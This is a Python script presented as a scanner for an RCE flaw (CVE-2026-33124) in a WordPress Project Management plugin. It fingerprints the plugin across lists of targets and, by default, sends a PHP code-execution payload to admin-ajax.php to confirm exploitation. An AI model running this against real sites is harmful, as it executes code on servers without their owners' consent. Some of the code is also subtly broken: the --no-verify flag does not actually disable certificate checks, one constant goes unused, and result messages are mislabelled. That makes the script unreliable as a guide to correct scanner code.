#!/usr/bin/env python3
"""
WordPress Project Management Plugin RCE Scanner (CVE-2026-33124)
=================================================================
This tool scans WordPress sites for remote code execution (RCE) vulnerabilities in the Project Management plugin.

CVE-2026-33124 details:
  - Affects WordPress Project Management Plugin versions 2.3.0 and below
  - Vulnerability arises due to improper validation of input passed to AJAX endpoints
  - Attackers can execute arbitrary PHP code through crafted payloads
  - Fixed in Project Management Plugin v2.3.1 (March 2026)

Usage:
  # Scan a single target
  python wordpress_project_management_rce_scanner.py --target https://example.com

  # Scan a list of targets
  python wordpress_project_management_rce_scanner.py --list targets.txt --output findings.json

  # Safe mode — detection only, no exploitation probes
  python wordpress_project_management_rce_scanner.py --list targets.txt --safe

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-33124
  - https://wordpress.org/plugins/project-management/
"""

import asyncio
import argparse
import json
import re
from urllib.parse import urlparse

import httpx

# ── Detection markers ─────────────────────────────────────────────────────────

PLUGIN_FINGERPRINTS = [
    "<meta name=\"generator\" content=\"Project Management Plugin\"",
    "/wp-content/plugins/project-management/",
]

DETECTION_PATHS = [
    "/",
    "/wp-admin/",
    "/wp-content/plugins/project-management/",
]

VERSION_PATTERNS = [
    r"Project Management Plugin v([0-9]+\.[0-9]+\.[0-9]+)",
    r"Version: ([0-9]+\.[0-9]+\.[0-9]+)",
]

VULN_FIXED_VERSION = (2, 3, 1)
SEMAPHORE_LIMIT = 30
REQUEST_TIMEOUT = 8

EXPLOIT_PATH = "/wp-admin/admin-ajax.php"

# ── Helpers ──────────────────────────────────────────────────────────────────

def parse_version(text: str):
    """Extract and parse the first version string found in text."""
    for pattern in VERSION_PATTERNS:
        match = re.search(pattern, text)
        if match:
            try:
                return tuple(int(x) for x in match.group(1).split("."))
            except ValueError:
                pass
    return None

def is_vulnerable_version(version_tuple):
    """Checks if the version is vulnerable to the exploit."""
    if version_tuple is None:
        return None  # Unknown
    return version_tuple < VULN_FIXED_VERSION

def normalize_url(url: str) -> str:
    """Ensure a URL is well-formatted with a scheme."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")

def log_with_color(level: str, message: str):
    """Print formatted logs with ANSI color codes."""
    colors = {
        "CRITICAL": "\033[91m",  # Red
        "HIGH": "\033[93m",      # Yellow
        "INFO": "\033[92m",      # Green
        "RESET": "\033[0m",      # Reset
    }
    print(f"{colors.get(level, colors['RESET'])}[{level}] {message}{colors['RESET']}")

# ── Core scanner ────────────────────────────────────────────────────────────

async def detect_plugin(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Detect whether a WordPress site is using the vulnerable Project Management plugin.
    Returns dict with detection info, or None if the plugin is not found.
    """
    async with semaphore:
        version = None
        detected = False
        raw_version_str = None

        for path in DETECTION_PATHS:
            url = base_url + path
            try:
                response = await client.get(url, timeout=REQUEST_TIMEOUT)
                for marker in PLUGIN_FINGERPRINTS:
                    if marker in response.text:
                        detected = True
                        version = parse_version(response.text)
                        if version:
                            raw_version_str = ".".join(map(str, version))
                        break
                if detected:
                    break
            except (httpx.RequestError, Exception):
                pass

        return {
            "url": base_url,
            "detected": detected,
            "version": raw_version_str,
            "vulnerable": is_vulnerable_version(version),
        }

async def probe_exploit(client: httpx.AsyncClient, base_url: str, semaphore: asyncio.Semaphore):
    """
    Attempt active exploitation of the RCE vulnerability on the target server.
    Returns True if exploitation appears successful, False otherwise.
    """
    async with semaphore:
        url = base_url + EXPLOIT_PATH
        payload = {"action": "execute_code", "code": "echo 'RCE-Test';"}
        try:
            response = await client.post(url, data=payload, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200 and "RCE-Test" in response.text:
                return True
        except httpx.RequestError:
            pass
        return False

async def scan_target(client: httpx.AsyncClient, url: str, semaphore: asyncio.Semaphore, safe: bool):
    """
    Scan a single target for detection and exploitation of the vulnerability.
    Returns scan results as a dictionary.
    """
    url = normalize_url(url)
    detection = await detect_plugin(client, url, semaphore)
    if not detection["detected"]:
        return {"url": url, "detected": False}

    exploitation_result = None
    if detection["vulnerable"] and not safe:
        exploitation_result = await probe_exploit(client, url, semaphore)

    return {
        "url": url,
        "detected": detection["detected"],
        "version": detection["version"],
        "vulnerable": detection["vulnerable"],
        "exploitable": exploitation_result,
    }

async def main(args):
    """Main entry point function."""
    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient() as client:
        if args.list:
            with open(args.list, "r") as file:
                targets = [line.strip() for line in file if line.strip()]
        else:
            targets = [args.target]

        tasks = [scan_target(client, target, semaphore, args.safe) for target in targets]
        results = await asyncio.gather(*tasks)

        if args.output:
            with open(args.output, "w") as f:
                json.dump(results, f, indent=2)
        else:
            for result in results:
                url = result["url"]
                if not result["detected"]:
                    log_with_color("INFO", f"{url} - Not vulnerable (Plugin not detected)")
                elif result["vulnerable"] and result["exploitable"]:
                    log_with_color("CRITICAL", f"{url} - Vulnerable and exploitable (RCE successful!)")
                elif result["vulnerable"]:
                    log_with_color("HIGH", f"{url} - Vulnerable but not exploitable (safe mode)")
                else:
                    log_with_color("INFO", f"{url} - Not vulnerable (patched version or undetectable)")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Scan for WordPress Project Management Plugin RCE vulnerability (CVE-2026-33124).")
    parser.add_argument("--target", help="Target URL to scan")
    parser.add_argument("--list", help="File containing a list of URLs to scan")
    parser.add_argument("--output", help="File to save JSON results")
    parser.add_argument("--safe", action="store_true", help="Detection only, no exploitation probes")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent requests")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
    args = parser.parse_args()

    if args.no_verify:
        httpx._config.trust_env = False

    asyncio.run(main(args))
